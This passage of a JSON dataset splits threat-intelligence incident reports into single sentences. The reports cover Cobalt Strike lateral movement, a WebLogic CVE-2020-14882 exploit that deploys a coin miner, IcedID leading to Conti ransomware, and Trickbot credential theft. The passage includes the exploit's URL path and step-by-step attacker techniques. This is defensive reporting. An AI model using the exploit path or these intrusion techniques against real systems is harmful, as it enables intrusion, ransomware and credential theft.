        "line": 42,
        "index": 6511
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S43",
        "text": "The threat actors attempted and successfully managed to pivot laterally to various hosts on the domain.",
        "type": "",
        "report": "r-dfir-29",
        "line": 43,
        "index": 6512
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S44",
        "text": "This was achieved by connecting via SMB and starting a service that would execute an encrypted PowerShell command with embedded Cobalt Strike SMB beacons.",
        "type": "",
        "report": "r-dfir-29",
        "line": 44,
        "index": 6513
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S45",
        "text": "The PowerShell is base64 encoded.",
        "type": "",
        "report": "r-dfir-29",
        "line": 45,
        "index": 6514
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S46",
        "text": "Decoding the PowerShell shows that the SMB pipe is named \\\\.\\pipe\\halfduplux_9e.\n",
        "type": "",
        "report": "r-dfir-29",
        "line": 46,
        "index": 6515
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S47",
        "text": "Using the \u2018Administrator\u2019 account, SMB sessions were established to the hosts, primarily using ADMIN$, but IPC$ was also observed.\n",
        "type": "",
        "report": "r-dfir-29",
        "line": 47,
        "index": 6516
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S48",
        "text": "This activity triggered two Emerging Threat (ET) alerts related to RPC access and binary execution, \u201cET RPC DCERPC SVCCTL \u2013 Remote Service Control Manager Access\u201d and \u201cET POLICY SMB2 NT Create AndX Request For an Executable File\u201d.",
        "type": "",
        "report": "r-dfir-29",
        "line": 48,
        "index": 6517
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S49",
        "text": "Throughout the intrusion the threat actor used a mix of Port 80 and 443 for C2.",
        "type": "",
        "report": "r-dfir-29",
        "line": 49,
        "index": 6518
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S50",
        "text": "Port 80 was observed in the communication to testsubnet[.]com which contains a HTTP Cookie in the format: wordpress_<Base64EncodedString>.",
        "type": "",
        "report": "r-dfir-29",
        "line": 50,
        "index": 6519
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S51",
        "text": "This activity was observed at a rate of every 2-4 seconds.",
        "type": "",
        "report": "r-dfir-29",
        "line": 51,
        "index": 6520
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S52",
        "text": "No exfiltration was observed; however, we were able to determine that access to the File server was achieved, with multiple access attempts and successes.",
        "type": "",
        "report": "r-dfir-29",
        "line": 52,
        "index": 6521
    },
    {
        "id": "dfir-reports-filtered/r-dfir-29.md:::S53",
        "text": "No impact was observed nor any follow-on activities to deny, disrupt or destroy data or systems.\n",
        "type": "",
        "report": "r-dfir-29",
        "line": 53,
        "index": 6522
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S0",
        "text": "In the attack, the threat actor took around 2 minutes from initial access, to running a persistent coin miner.",
        "type": "",
        "report": "r-dfir-30",
        "line": 0,
        "index": 6523
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S1",
        "text": "The speed and number of times the exploit was ran against the target make it likely that this was an automated attack, rather than human operated intrusion.\n",
        "type": "",
        "report": "r-dfir-30",
        "line": 1,
        "index": 6524
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S2",
        "text": "The threat actor exploited CVE-2020-14882 by making a request to the WebLogic server, which allowed the attacker to execute code.",
        "type": "",
        "report": "r-dfir-30",
        "line": 2,
        "index": 6525
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S3",
        "text": "The payload then ran a PowerShell command to download a PowerShell script from a remote server.",
        "type": "",
        "report": "r-dfir-30",
        "line": 3,
        "index": 6526
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S4",
        "text": "This script downloaded a loader and executed it, then it enabled persistence mechanisms.",
        "type": "",
        "report": "r-dfir-30",
        "line": 4,
        "index": 6527
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S5",
        "text": "Next, the loader downloaded XMRig, and started the mining process.\n",
        "type": "",
        "report": "r-dfir-30",
        "line": 5,
        "index": 6528
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S6",
        "text": "While this attack took place around a month ago the payloads used in the intrusion continue to be hosted as of this publication, indicating that this threat is still active and finding vulnerable WebLogic hosts to continue exploiting.",
        "type": "",
        "report": "r-dfir-30",
        "line": 6,
        "index": 6529
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S7",
        "text": "Analysis and reporting completed by @tas_kmanager and @TheDFIRReport\n",
        "type": "",
        "report": "r-dfir-30",
        "line": 7,
        "index": 6530
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S8",
        "text": "Reviewed by @iiamaleks and @samaritan_o\n",
        "type": "",
        "report": "r-dfir-30",
        "line": 8,
        "index": 6531
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S9",
        "text": "Before jumping into the details of the attack, it is pertinent to understand CVE-2020-14882.",
        "type": "",
        "report": "r-dfir-30",
        "line": 9,
        "index": 6532
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S10",
        "text": "This vulnerability was discovered back in October 2020, which effects Oracle\u2019s WebLogic product.",
        "type": "",
        "report": "r-dfir-30",
        "line": 10,
        "index": 6533
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S11",
        "text": "[1] We previously reported on an intrusion that also used this exploit and ended in a coin miner.",
        "type": "",
        "report": "r-dfir-30",
        "line": 11,
        "index": 6534
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S12",
        "text": "This vulnerability is easy to exploit, and leads to remote code execution (RCE) without authentication.",
        "type": "",
        "report": "r-dfir-30",
        "line": 12,
        "index": 6535
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S13",
        "text": "Just by invoking URL path /console/images/%252E%252E%252Fconsole.portal and a little bit of tweaking of the packet sent to the server, the threat actor will be able to run their code on the server.\n",
        "type": "",
        "report": "r-dfir-30",
        "line": 13,
        "index": 6536
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S14",
        "text": "In this case, we can clearly see from network logs that the attacker was probing the portal page and followed that by sending the crafted URL request.\n",
        "type": "",
        "report": "r-dfir-30",
        "line": 14,
        "index": 6537
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S15",
        "text": "The detailed payload in the header can be observed below:\n",
        "type": "",
        "report": "r-dfir-30",
        "line": 15,
        "index": 6538
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S16",
        "text": "Interestingly, we can see the threat actor chose the FileSystemXmlApplicationContext class to carry out this attack, executing a file named poc.xml.",
        "type": "",
        "report": "r-dfir-30",
        "line": 16,
        "index": 6539
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S17",
        "text": "This technique is listed in PoC developed by Jang.",
        "type": "",
        "report": "r-dfir-30",
        "line": 17,
        "index": 6540
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S18",
        "text": "[2",
        "type": "",
        "report": "r-dfir-30",
        "line": 18,
        "index": 6541
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S19",
        "text": "]",
        "type": "",
        "report": "r-dfir-30",
        "line": 19,
        "index": 6542
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S20",
        "text": "Below we can see the payload inside of the xml file hosted in the attacker server.",
        "type": "",
        "report": "r-dfir-30",
        "line": 20,
        "index": 6543
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S21",
        "text": "The payload will execute the PowerShell command on the vulnerable system.\n",
        "type": "",
        "report": "r-dfir-30",
        "line": 21,
        "index": 6544
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S22",
        "text": "The threat actor leveraged the WebLogic vulnerability to spawn a command shell from the server running in the Java process, which then in turn, was used to run PowerShell and collect the final payload that the threat actor wished to run on the system.",
        "type": "",
        "report": "r-dfir-30",
        "line": 22,
        "index": 6545
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S23",
        "text": "Next, let us investigate the content of the PowerShell script (ldr.ps1)\n",
        "type": "",
        "report": "r-dfir-30",
        "line": 23,
        "index": 6546
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S24",
        "text": "On line one, we can see var $cc (can be pronounced as C2?) that indicates the server where it will get all the other components such as the payload sys.exe.",
        "type": "",
        "report": "r-dfir-30",
        "line": 24,
        "index": 6547
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S25",
        "text": "The next line sets up random characters to be appended to the payload executable.",
        "type": "",
        "report": "r-dfir-30",
        "line": 25,
        "index": 6548
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S26",
        "text": "This binary (renamed to sysvr013.exe) was then executed by the same script.\n",
        "type": "",
        "report": "r-dfir-30",
        "line": 26,
        "index": 6549
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S27",
        "text": "There are several persistence mechanisms observed.",
        "type": "",
        "report": "r-dfir-30",
        "line": 27,
        "index": 6550
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S28",
        "text": "The first one utilizes schtasks to create a task called \u201cBrowserUpdate\u201d.\n",
        "type": "",
        "report": "r-dfir-30",
        "line": 28,
        "index": 6551
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S29",
        "text": "It also created a registry run key to execute the miner binary on reboot.\n",
        "type": "",
        "report": "r-dfir-30",
        "line": 29,
        "index": 6552
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S30",
        "text": "We also observed the Loader binary adding npf.sys (WinPcap binary) as a scheduled task.\n",
        "type": "",
        "report": "r-dfir-30",
        "line": 30,
        "index": 6553
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S31",
        "text": "No privilege escalation was observed, but note that the Java.exe process was running as a high integrity process from the start.\n",
        "type": "",
        "report": "r-dfir-30",
        "line": 31,
        "index": 6554
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S32",
        "text": "From the PowerShell script above (ldr.ps1), we can see that name is being randomized to avoid detection by blue team.",
        "type": "",
        "report": "r-dfir-30",
        "line": 32,
        "index": 6555
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S33",
        "text": "We can also see that the attacker disabled firewall rules to make sure connection to the mining pool was not blocked.",
        "type": "",
        "report": "r-dfir-30",
        "line": 33,
        "index": 6556
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S34",
        "text": "As noted above, the attacker created a task called \u201cBrowserUpdate\u201d to masquerade the scheduled task as a web browser update task.",
        "type": "",
        "report": "r-dfir-30",
        "line": 34,
        "index": 6557
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S35",
        "text": "We can see several local discovery commands executed from the PowerShell script.",
        "type": "",
        "report": "r-dfir-30",
        "line": 35,
        "index": 6558
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S36",
        "text": "They are looking for existing mining process on the machine, such as kthreaddi, sysrv, etc.",
        "type": "",
        "report": "r-dfir-30",
        "line": 36,
        "index": 6559
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S37",
        "text": "They also utilize netstat to find if any process is using mining related ports, such as 3333, 4444, etc.\n",
        "type": "",
        "report": "r-dfir-30",
        "line": 37,
        "index": 6560
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S38",
        "text": "This is likely partially to kill other rival miners but also to prevent duplicate miners on the same host as the exploit was executed against the target repeatedly in quick succession, at least 12 times.",
        "type": "",
        "report": "r-dfir-30",
        "line": 38,
        "index": 6561
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S39",
        "text": "We saw that the additional sys.exe binary and ldr.ps1 PowerShell script was brought in to support the Mining operation from IP address 194[.]145[.]227[.]21\n",
        "type": "",
        "report": "r-dfir-30",
        "line": 39,
        "index": 6562
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S40",
        "text": "We also observed connection from [kthreaddi].exe talking to crypto mining pools\n",
        "type": "",
        "report": "r-dfir-30",
        "line": 40,
        "index": 6563
    },
    {
        "id": "dfir-reports-filtered/r-dfir-30.md:::S41",
        "text": "Eventually, the crypto mining operation will cause performance issue with the WebLogic server.\n",
        "type": "",
        "report": "r-dfir-30",
        "line": 41,
        "index": 6564
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S0",
        "text": "We assess with moderate confidence that the initial vector used by the threat actor was a zip file, which included a malicious JavaScript file, delivered through a phishing campaign.",
        "type": "",
        "report": "r-dfir-31",
        "line": 0,
        "index": 6565
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S1",
        "text": "The JavaScript file would eventually download and execute the IcedID malware.",
        "type": "",
        "report": "r-dfir-31",
        "line": 1,
        "index": 6566
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S2",
        "text": "Discovered in 2017, what started as a commodity malware is now currently being deployed as an initial access broker by ransomware threat actors.",
        "type": "",
        "report": "r-dfir-31",
        "line": 2,
        "index": 6567
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S3",
        "text": "While there was some initial discovery activity from the IcedID malware, it went quiet, just beaconing to command and control but not performing any other activity.",
        "type": "",
        "report": "r-dfir-31",
        "line": 3,
        "index": 6568
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S4",
        "text": "After being dormant for over two days, a Cobalt Strike Beacon was dropped and executed on the system infected with IcedID.",
        "type": "",
        "report": "r-dfir-31",
        "line": 4,
        "index": 6569
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S5",
        "text": "The threat actors then ran another round of discovery activity with native windows utilities such as nltest.exe, whoami.exe, and net.exe.",
        "type": "",
        "report": "r-dfir-31",
        "line": 5,
        "index": 6570
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S6",
        "text": "They then successfully escalated to SYSTEM privileges via Cobalt Strike\u2019s built-in \u201cnamed pipe impersonation\u201d (GetSystem) functionality.",
        "type": "",
        "report": "r-dfir-31",
        "line": 6,
        "index": 6571
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S7",
        "text": "The threat actors continued by moving laterally to the domain controllers on the network using SMB to transfer and execute a Cobalt Strike Beacon.",
        "type": "",
        "report": "r-dfir-31",
        "line": 7,
        "index": 6572
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S8",
        "text": "During that time, we observed port scanning activity from one of the domain controllers, to identify open ports such as SSH, SMB, MSSQL, RDP and WinRM.",
        "type": "",
        "report": "r-dfir-31",
        "line": 8,
        "index": 6573
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S9",
        "text": "After a brief gap of 15 minutes, the threat actors used PsExec, to copy and execute a Cobalt Strike Beacon DLL on most of the systems in the network.",
        "type": "",
        "report": "r-dfir-31",
        "line": 9,
        "index": 6574
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S10",
        "text": "Later in the attack, the threat actor was seen establishing RDP connections from the beachhead host to the domain controller and other systems throughout the environment.",
        "type": "",
        "report": "r-dfir-31",
        "line": 10,
        "index": 6575
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S11",
        "text": "This RDP activity was being proxied through the IcedID process running on that host, to a remote proxy over port 8080.",
        "type": "",
        "report": "r-dfir-31",
        "line": 11,
        "index": 6576
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S12",
        "text": "To establish persistence, the attackers created a new local user on one of the domain controllers and added it to the Administrators group.",
        "type": "",
        "report": "r-dfir-31",
        "line": 12,
        "index": 6577
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S13",
        "text": "Additionally, in an effort to evade any detection and prevention mechanisms, they disabled Windows Defender via a group policy modification.",
        "type": "",
        "report": "r-dfir-31",
        "line": 13,
        "index": 6578
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S14",
        "text": "Within two and a half hours of Cobalt Strike showing up in the environment and just over two days after the initial IcedID infection, the threat actors completed their objective of encrypting all systems.",
        "type": "",
        "report": "r-dfir-31",
        "line": 14,
        "index": 6579
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S15",
        "text": "Conti was executed in memory with the help of the Cobalt Strike Beacons domain wide.",
        "type": "",
        "report": "r-dfir-31",
        "line": 15,
        "index": 6580
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S16",
        "text": "The ransomware note left by the infection included a link to their Tor site for further details.",
        "type": "",
        "report": "r-dfir-31",
        "line": 16,
        "index": 6581
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S17",
        "text": "After further review of the environment (post encryption), we realized multiple systems (including a domain controller) were unable to be accessed and would not have been restorable even if the ransom had been paid.\n",
        "type": "",
        "report": "r-dfir-31",
        "line": 17,
        "index": 6582
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S18",
        "text": "The IcedID DLL that we executed was most likely dropped through a zip file, which included a JavaScript file within it.",
        "type": "",
        "report": "r-dfir-31",
        "line": 18,
        "index": 6583
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S19",
        "text": "Brad had a few posts about these around the time of this intrusion.",
        "type": "",
        "report": "r-dfir-31",
        "line": 19,
        "index": 6584
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S20",
        "text": "1 2 Thanks Brad!\n",
        "type": "",
        "report": "r-dfir-31",
        "line": 20,
        "index": 6585
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S21",
        "text": "Various attributes including the computer name and the OS version of the compromised system were sent through encoded cookie values.\n",
        "type": "",
        "report": "r-dfir-31",
        "line": 21,
        "index": 6586
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S22",
        "text": "IcedID was executed via rundll32.exe and ran command and control over port 443 for the duration of the intrusion.\n",
        "type": "",
        "report": "r-dfir-31",
        "line": 22,
        "index": 6587
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S23",
        "text": "IcedID ran initial discovery after being executed on the beachhead.",
        "type": "",
        "report": "r-dfir-31",
        "line": 23,
        "index": 6588
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S24",
        "text": "Various commands were executed to gather more information about the compromised environment; including the currently logged on user, domain trusts, groups, etc .\n",
        "type": "",
        "report": "r-dfir-31",
        "line": 24,
        "index": 6589
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S25",
        "text": "Additional discovery commands were executed by Cobalt Strike.\n",
        "type": "",
        "report": "r-dfir-31",
        "line": 25,
        "index": 6590
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S26",
        "text": "After moving laterally to a domain controller, they began looking for what networks were present in the environment using dsquery.\n",
        "type": "",
        "report": "r-dfir-31",
        "line": 26,
        "index": 6591
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S27",
        "text": "Shortly thereafter, port scanning was observed coming from a domain controller looking for common ports (such as SSH, SMB, MSSQL, WinRM and RDP, etc.) on systems residing in the same subnet.",
        "type": "",
        "report": "r-dfir-31",
        "line": 27,
        "index": 6592
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S28",
        "text": "In order to obtain SYSTEM level privileges, Cobalt Strike\u2019s built-in named piped impersonation (GetSystem) was used:\n",
        "type": "",
        "report": "r-dfir-31",
        "line": 28,
        "index": 6593
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S29",
        "text": "The threat actor began lateral movement using remote execution of Cobalt Strike Beacon service binaries.\n",
        "type": "",
        "report": "r-dfir-31",
        "line": 29,
        "index": 6594
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S30",
        "text": "After this initial activity, Cobalt Strike was used to enable RDP, and allow it through the firewall, on the domain controllers.\n",
        "type": "",
        "report": "r-dfir-31",
        "line": 30,
        "index": 6595
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S31",
        "text": "Following this, the threat actors then copied a Cobalt Strike Beacon DLL to the ADMIN$ share; and then, distributed it throughout the environment using PsExec.\n",
        "type": "",
        "report": "r-dfir-31",
        "line": 31,
        "index": 6596
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S32",
        "text": "From here, RDP connections were established from the beachhead host to systems throughout the environment.",
        "type": "",
        "report": "r-dfir-31",
        "line": 32,
        "index": 6597
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S33",
        "text": "The connections were proxied through the IcedID process.\n",
        "type": "",
        "report": "r-dfir-31",
        "line": 33,
        "index": 6598
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S34",
        "text": "The threat actor used a redirector (38.135.122[.]194:8080) to proxy the RDP traffic being passed through the IcedID process.",
        "type": "",
        "report": "r-dfir-31",
        "line": 34,
        "index": 6599
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S35",
        "text": "The below traffic shows more details of the RDP session, including the username in the cookie.\n",
        "type": "",
        "report": "r-dfir-31",
        "line": 35,
        "index": 6600
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S36",
        "text": "This proxied traffic reported back the hostname of the threat actors machine as \u201cmikespc\u201d.",
        "type": "",
        "report": "r-dfir-31",
        "line": 36,
        "index": 6601
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S37",
        "text": "We\u2019re looking for you Mike! \ud83d\ude09\n",
        "type": "",
        "report": "r-dfir-31",
        "line": 37,
        "index": 6602
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S38",
        "text": "To evade detection, the threat actors disabled Windows Defender by adding the below to an already linked GPO.",
        "type": "",
        "report": "r-dfir-31",
        "line": 38,
        "index": 6603
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S39",
        "text": "They then force updated the GPO on all clients using Cobalt Strike.",
        "type": "",
        "report": "r-dfir-31",
        "line": 39,
        "index": 6604
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S40",
        "text": "In addition, other security services were stopped or uninstalled.\n",
        "type": "",
        "report": "r-dfir-31",
        "line": 40,
        "index": 6605
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S41",
        "text": "An account named \u201cnuuser\u201d was created by one of the Cobalt Strike Beacons.",
        "type": "",
        "report": "r-dfir-31",
        "line": 41,
        "index": 6606
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S42",
        "text": "As these commands were run on a domain controller, it essentially added the account to the Built-in Administrators domain group, granting it administrative privileges in the AD domain.\n",
        "type": "",
        "report": "r-dfir-31",
        "line": 42,
        "index": 6607
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S43",
        "text": "LSASS was accessed by an unusual process \u201crunonce.exe\u201d on multiple hosts, including a domain controller.\n",
        "type": "",
        "report": "r-dfir-31",
        "line": 43,
        "index": 6608
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S44",
        "text": "The overpass-the hash technique was used to acquire a valid Kerberos ticket for the administrator user.\n",
        "type": "",
        "report": "r-dfir-31",
        "line": 44,
        "index": 6609
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S45",
        "text": "About two and a half hours after initial hands on keyboard activity, the Cobalt Strike Beacon processes running across the target systems injected the Conti DLL into memory.",
        "type": "",
        "report": "r-dfir-31",
        "line": 45,
        "index": 6610
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S46",
        "text": "Conti deployments using a DLL seem to have first started showing up in December 2020.\n",
        "type": "",
        "report": "r-dfir-31",
        "line": 46,
        "index": 6611
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S47",
        "text": "First time that I see #Conti ransomware spread as a DLL :\n",
        "type": "",
        "report": "r-dfir-31",
        "line": 47,
        "index": 6612
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S48",
        "text": "Some traces of this particular DLL were found in the memory dump taken from one of the compromised systems.\n",
        "type": "",
        "report": "r-dfir-31",
        "line": 48,
        "index": 6613
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S49",
        "text": "We were unable to reconstruct the DLL from memory but Maxime Thiebaut (@0xThiebaut) from NVISO helped us out.",
        "type": "",
        "report": "r-dfir-31",
        "line": 49,
        "index": 6614
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S50",
        "text": "The Yara rule, located in the detections section below was made possible due to him reconstructing the DLL.",
        "type": "",
        "report": "r-dfir-31",
        "line": 50,
        "index": 6615
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S51",
        "text": "Thanks Maxime!",
        "type": "",
        "report": "r-dfir-31",
        "line": 51,
        "index": 6616
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S52",
        "text": "Conti scans the network for 445/SMB, looking for machines to encrypt.\n",
        "type": "",
        "report": "r-dfir-31",
        "line": 52,
        "index": 6617
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S53",
        "text": "Ransom note\n",
        "type": "",
        "report": "r-dfir-31",
        "line": 53,
        "index": 6618
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S54",
        "text": "Which leads you here.",
        "type": "",
        "report": "r-dfir-31",
        "line": 54,
        "index": 6619
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S55",
        "text": "The threat actors asked for 150k and could have been talked down at least ~20%.\n",
        "type": "",
        "report": "r-dfir-31",
        "line": 55,
        "index": 6620
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S56",
        "text": "Multiple machines within the environment were not usable after being ransomed including a domain controller.",
        "type": "",
        "report": "r-dfir-31",
        "line": 56,
        "index": 6621
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S57",
        "text": "The machines were left like this and you were not able to do anything but press control+alt+delete.",
        "type": "",
        "report": "r-dfir-31",
        "line": 57,
        "index": 6622
    },
    {
        "id": "dfir-reports-filtered/r-dfir-31.md:::S58",
        "text": "Paying the ransom will not help you here.",
        "type": "",
        "report": "r-dfir-31",
        "line": 58,
        "index": 6623
    },
    {
        "id": "dfir-reports-filtered/r-dfir-32.md:::S0",
        "text": "We assess, with moderate confidence, the Trickbot DLL that we executed was originally delivered via a malicious Office document.",
        "type": "",
        "report": "r-dfir-32",
        "line": 0,
        "index": 6624
    },
    {
        "id": "dfir-reports-filtered/r-dfir-32.md:::S1",
        "text": "The threat actors were observed leveraging Trickbot and Cobalt Strike for C2 communication.",
        "type": "",
        "report": "r-dfir-32",
        "line": 1,
        "index": 6625
    },
    {
        "id": "dfir-reports-filtered/r-dfir-32.md:::S2",
        "text": "They began their discovery by running net and nltest commands as well as PowerView domain discovery modules.",
        "type": "",
        "report": "r-dfir-32",
        "line": 2,
        "index": 6626
    },
    {
        "id": "dfir-reports-filtered/r-dfir-32.md:::S3",
        "text": "Minutes later, Lazagne (\u201cretrieve lots of passwords\u201d) was executed using the \u201call\u201d switch.",
        "type": "",
        "report": "r-dfir-32",
        "line": 3,
        "index": 6627
    },
    {
        "id": "dfir-reports-filtered/r-dfir-32.md:::S4",
        "text": "A registry value was set to enable storing logon credentials in plaintext in memory (WDigest), likely to facilitate future activity as the host was not restarted for this change to take effect.",
        "type": "",
        "report": "r-dfir-32",
        "line": 4,
        "index": 6628
    },
    {
        "id": "dfir-reports-filtered/r-dfir-32.md:::S5",
        "text": "Before the threat actors departed the network, they successfully accessed the LSASS process and retrieved credentials from memory.",
        "type": "",
        "report": "r-dfir-32",
        "line": 5,
        "index": 6629
    },
    {
        "id": "dfir-reports-filtered/r-dfir-32.md:::S6",
        "text": "No lateral movement or execution on mission was observed.\n",
        "type": "",
        "report": "r-dfir-32",
        "line": 6,
        "index": 6630
    },
    {
        "id": "dfir-reports-filtered/r-dfir-32.md:::S7",
        "text": "We assess with moderate confidence that this DLL was dropped by a malicious Office document.\n",
        "type": "",
        "report": "r-dfir-32",
        "line": 7,
        "index": 6631
    },
    {
        "id": "dfir-reports-filtered/r-dfir-32.md:::S8",
        "text": "Trickbot (click.php.dll) was manually executed on a single endpoint.",
        "type": "",
        "report": "r-dfir-32",
        "line": 8,
        "index": 6632
    },
    {
        "id": "dfir-reports-filtered/r-dfir-32.md:::S9",
        "text": "Source: https://tria.ge/210412-wmdnkzp5la\n",
        "type": "",
        "report": "r-dfir-32",
        "line": 9,
        "index": 6633
    },
    {
        "id": "dfir-reports-filtered/r-dfir-32.md:::S10",
        "text": "Trickbot, from its injected wermgr process, spawned a command process to then run a PowerShell Cobalt Strike Beacon.",
        "type": "",
        "report": "r-dfir-32",
        "line": 10,
        "index": 6634
    },
    {
        "id": "dfir-reports-filtered/r-dfir-32.md:::S11",
        "text": "Reviewing the above PowerShell code, we can extract the shellcode to discover the IP and User-agent string, the beacon will communicate with.",
        "type": "",
        "report": "r-dfir-32",
        "line": 11,
        "index": 6635
    },
    {
        "id": "dfir-reports-filtered/r-dfir-32.md:::S12",
        "text": "Getting the IP and port using scdbg.\n",
        "type": "",
        "report": "r-dfir-32",
        "line": 12,
        "index": 6636
    },
    {
        "id": "dfir-reports-filtered/r-dfir-32.md:::S13",
        "text": "The threat actor also executed a second Cobalt Strike Beacon (wsuC3C.tmp) using the injected wermgr.exe process.\n",
        "type": "",
        "report": "r-dfir-32",
        "line": 13,
        "index": 6637
    },
    {
        "id": "dfir-reports-filtered/r-dfir-32.md:::S14",
        "text": "A scheduled task was created to keep the Trickbot malware persistent on the system.\n",
        "type": "",
        "report": "r-dfir-32",
        "line": 14,
        "index": 6638
    },
    {
        "id": "dfir-reports-filtered/r-dfir-32.md:::S15",
        "text": "Trickbot injected into wermgr.exe processes and used this for communication to command and control infrastructure.\n",
        "type": "",
        "report": "r-dfir-32",
        "line": 15,
        "index": 6639
    },
    {
